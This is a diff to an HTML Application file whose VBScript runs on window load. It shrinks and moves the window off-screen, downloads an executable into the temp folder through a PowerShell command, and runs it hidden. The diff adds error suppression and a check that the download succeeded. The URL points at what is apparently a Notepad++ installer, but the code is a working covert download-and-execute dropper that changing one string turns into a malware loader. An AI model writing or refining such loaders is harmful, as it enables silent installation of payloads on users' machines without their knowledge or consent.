@@ -6,10 +6,13 @@
 <body>
     <script language="VBScript">
         Sub Window_onLoad()
+            On Error Resume Next ' Enable error handling
+
             Window.ResizeTo 1, 1
             Window.MoveTo -32000, -32000
 
             Set objShell = CreateObject("WScript.Shell")
+            Set fso = CreateObject("Scripting.FileSystemObject") ' For file existence check
 
             tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
             downloadUrl = "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.7.6/npp.8.7.6.Installer.x64.exe"
@@ -19,8 +22,16 @@
             cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
             objShell.Run "cmd.exe /c " & cmdCommand, 0, True
 
-            ' Execute the downloaded file
-            objShell.Run downloadedFile, 0, False
+            ' Check if the file was downloaded successfully
+            If fso.FileExists(downloadedFile) Then
+                ' File exists, execute it
+                objShell.Run downloadedFile, 0, False
+            Else
+                ' File does not exist, show an error message
+                MsgBox "Error: The file was not downloaded. Please check the URL or your internet connection.", vbCritical, "Download Failed"
+            End If
+
+            On Error GoTo 0 ' Disable error handling
         End Sub
 
         ' Trigger the Window_onLoad subroutine when the window loads
